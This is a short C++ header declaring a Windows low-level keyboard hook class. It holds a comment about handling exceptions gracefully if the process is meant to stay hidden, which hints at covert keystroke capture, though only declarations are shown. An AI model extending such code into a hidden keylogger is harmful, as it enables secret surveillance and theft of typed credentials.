#pragma once
#include <Windows.h>
#include <iostream>
/*
	TODO: Make sure exceptions are gracefully handled.
	(Especially important if this process is supposed to be hidden)
	
	Exceptions are handled differently on 32bit and 64 bit systems. Read
	https://msdn.microsoft.com/en-us/library/windows/desktop/ms633573(v=vs.85).aspx
	for more information.

	Good forum thread on what LRESULT CALLBACK declaration means, including
	a guy that doesn't know what "ftw" means:
	http://www.cplusplus.com/forum/windows/46961/	

*/


class KeyboardHook
{
public:
	KeyboardHook();
	~KeyboardHook();
	bool isActive();
private:
	static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
	HHOOK hhkLowLevelKybd;
	MSG msg;
};

